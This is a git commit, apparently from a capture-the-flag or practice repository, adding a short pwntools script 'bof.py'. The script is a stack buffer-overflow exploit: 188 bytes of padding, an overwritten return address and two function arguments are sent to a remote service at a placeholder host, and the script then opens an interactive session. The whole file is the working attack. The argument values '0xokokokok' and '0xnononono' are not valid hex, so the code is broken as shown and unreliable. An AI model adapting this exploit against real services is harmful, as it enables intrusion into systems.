0a3f8bbfbf1f949efd7c61dd113799520da38101
Adil Aheyad <44920953+5h3r10ck@users.noreply.github.com>
2020-05-01 14:21:13 +0000

    bof

---
+++ bof.py
@@ -0,0 +1,13 @@
+from socket import socket
+from pwn import *
+ip = "test.test"
+port = 1337
+addr = p32(0x080491e2)
+no = "AAAA"
+arg1 = p32(0xokokokok)
+arg2 = p32(0xnononono)
+payload = "A"*188+addr+no+arg1+arg2
+r = remote(ip, port)
+r.recvline()
+r.sendline(payload)
+r.interactive()
